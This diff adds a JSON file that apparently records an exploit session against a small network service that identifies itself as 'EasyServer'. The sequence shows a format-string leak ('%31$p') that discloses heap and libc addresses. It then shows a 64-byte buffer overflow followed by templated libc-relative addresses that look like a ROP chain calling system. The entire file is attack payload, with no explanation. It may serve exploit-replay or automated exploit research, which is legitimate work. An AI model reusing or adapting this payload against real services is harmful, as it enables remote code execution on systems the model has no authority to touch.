@@ -1,0 +1,7 @@
+[
+    "1Who r u?\\n", 
+    "0%31$p\\n", 
+    "1{{{HEAP_BASE:9591:3:ORI:0:0x6c6577}}}{{{HEAP_BASE:77667:3:ORI:3:0x6d6f63}}}e!0x{{{LIBC_BASE:133168:12:HEX:10:0x7f19cd90b830}}}", 
+    "0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00{{{LIBC_BASE:135426:8:ORI:72:0x7f19cd90c102}}}{{{LIBC_BASE:1625431:8:ORI:80:0x7f19cda77d57}}}{{{LIBC_BASE:283536:8:ORI:88:0x7f19cd930390}}}\\n", 
+    "1aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\x01HTTP/1.1 404 Not Found\\r\\nContent-Type: text/{{{HEAP_BASE:78952:3:ORI:108:0x6d7468}}}l; charset=UTF-8\\r\\nContent-Length: 23\\r\\nServer: EasyServer (Linux)\\r\\n\\r\\n<h3>Page Not Found</h3>"
+]
